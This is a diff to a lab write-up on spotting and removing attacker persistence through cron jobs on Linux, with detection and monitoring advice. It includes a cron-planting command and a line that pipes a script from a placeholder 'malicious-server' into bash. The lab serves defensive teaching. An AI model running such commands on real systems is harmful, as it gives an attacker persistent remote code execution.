@@ -34,18 +34,6 @@ Run commands automatically (e.g., every minute, daily, weekly)
 Useful for backups, updates, monitoring scripts, etc.
 Works in the background via the cron service
 
-
-🧾 Format of a crontab Entry
-
-*  *  *  *  *  command-to-run
-│  │  │  │  │
-│  │  │  │  └─── Day of the Week (0 - 7) (Sunday = 0 or 7)
-│  │  │  └────── Month (1 - 12)
-│  │  └───────── Day of Month (1 - 31)
-│  └──────────── Hour (0 - 23)
-└──────────────── Minute (0 - 59)
-
-
 ## 🛠️ Lab Setup
 
 - **Target System**: Ubuntu Linux (Kali or Ubuntu VM)
@@ -61,7 +49,7 @@ An attacker has added a cron job that silently runs a malicious script from /tmp
 ### Simulating the Attack:
 1. Attacker add a schedule cron job:
 ```bash
-(crontab -l 2>/dev/null; echo "* * * * * /tmp/payload.sh" | crontab - 
+(crontab -l 2>/dev/null; echo "* * * * * /tmp/payload.sh") | crontab -
 ```
 
 2. Create Payload script
@@ -85,8 +73,8 @@ curl http://malicious-server/payload.sh | bash
 crontab -l
 grep CRON /var/log/syslog
 ``` 
-📖 Reference
-🧾 Format of a crontab Entry
+📖 Reference: 🧾 Format of a crontab Entry
+```text
 *  *  *  *  *  command-to-run
 │  │  │  │  │
 │  │  │  │  └─── Day of the Week (0 - 7) (Sunday = 0 or 7)
@@ -133,22 +121,45 @@ rm -f /tmp/malicious.sh /tmp/.cron.log
 sudo systemctl restart cron
 ```
 
-### Step 4. Post-Incident Activity
-- Document the following:
-- When the cron job was added
-- What the script was doing
-- Any signs of lateral movement or download activity
-- Recommendations:
-- Restrict cron job access to authorized users only
-- Enable cron integrity checks
-- Set up alerts for new cron entries (using auditd or inotify)
+### Step 3. Post-Incident Activity
 
+- 📝 Document the following:
+  - When the cron job was added
+  - What the script was doing
+  - Any signs of lateral movement or download activity
+
+- 🛡️ Recommendations:
+  - Restrict cron access to authorized users only
+  - Enable cron integrity checks
+  - Set up alerts for new cron entries (e.g., auditd or inotify)
+
+  
 ### 📸 Screenshot
 <p align="center">
   <img src="../../Screenshots/Day-13-Incident-Response_Containment-Eradication-Recovery.png" width="400">
 </p> <p align="center"><em>Containment & Eradication</em></p>
 
 ---
+
+<details>
+<summary>💡 <strong>Pro Tip: Real-World Cron Monitoring</strong></summary>
+
+To enhance detection of unauthorized persistence via cron in production systems:
+
+- 🧩 Use **auditd** to watch for modifications in:
+  - `/etc/crontab`
+  - `/etc/cron.d/`
+  - `/var/spool/cron/crontabs/`
+
+- 👁️ Use **inotify** or `inotifywait` to monitor cron directories for real-time changes.
+
+- 🛡️ Deploy **Wazuh**, **OSSEC**, or similar HIDS tools to:
+  - Detect unauthorized cron job creation
+  - Alert on execution of scripts from `/tmp`, `/dev/shm`, etc.
+  
+- 📊 Forward cron logs to a SIEM (e.g., ELK, Splunk, Graylog) for centralized alerting and correlation.
+
+</details>
 
 ## 🧠 Key Learnings
 - ✅  Simulated attacker persistence via cron job
